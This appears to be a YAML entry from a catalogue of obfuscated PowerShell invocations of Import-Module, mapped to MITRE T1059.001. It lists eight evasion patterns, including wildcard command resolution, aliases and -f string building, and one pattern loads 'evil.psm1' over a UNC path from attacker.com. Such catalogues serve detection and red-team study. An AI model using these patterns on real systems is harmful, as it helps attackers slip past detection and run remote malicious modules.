---
Name: Import-Module
Description: "Load PowerShell modules from disk, UNC paths, or the module store. Used to load malicious modules containing custom cmdlets or offensive toolkits."
Platform: powershell
BinaryPath:
  - "PowerShell cmdlet"
Category: execution
MitreID: T1059.001
Patterns:
  - Pattern: "& (gcm I*-M*) -Name \\\\attacker.com\\share\\evil.psm1"
    Wildcards: ["*"]
    Notes: "Wildcards on both verb and noun — loads module from UNC path"
  - Pattern: "& (gcm Import-M*) -Name evil.psm1"
    Wildcards: ["*"]
    Notes: "Star suffix matches 'odule'"
  - Pattern: "& (gcm I?port-Module) -Name evil.psm1"
    Wildcards: ["?"]
    Notes: "Single char wildcard replaces 'm'"
  - Pattern: "ipmo -Name evil.psm1"
    Wildcards: []
    Notes: "Built-in alias 'ipmo' for Import-Module"
  - Pattern: "& (gal ip?o) -Name evil.psm1"
    Wildcards: ["?"]
    Notes: "Get-Alias with wildcard resolves 'ipmo'"
  - Pattern: "& (gcm I[l-n]port-Module) -Name evil.psm1"
    Wildcards: ["[l-n]"]
    Notes: "Character range [l-n] matches 'm' in Import — only character in range that satisfies Import-Module"
  - Pattern: "& (gcm *-Module) -Name evil.psm1"
    Wildcards: ["*"]
    Notes: "Prefix wildcard on noun — note: may match other *-Module cmdlets; add -CommandType Cmdlet to limit"
  - Pattern: "& (gcm ('{0}port-{1}' -f 'Im','Module')) -Name evil.psm1"
    Wildcards: []
    Notes: "-f format operator constructs 'Import-Module' from fragments before gcm resolves it"
    Method: "-f format operator"
PlatformNotes: |
  Import-Module loads `.psm1`, `.psd1`, or `.dll` files. It can load from UNC paths (`\\server\share\module.psm1`) for living-off-the-land network staging. The `ipmo` alias is built-in. Modules can contain arbitrary cmdlets and functions that execute on import via `$PSDefaultParameterValues` or module scripts.
Resources:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module
---
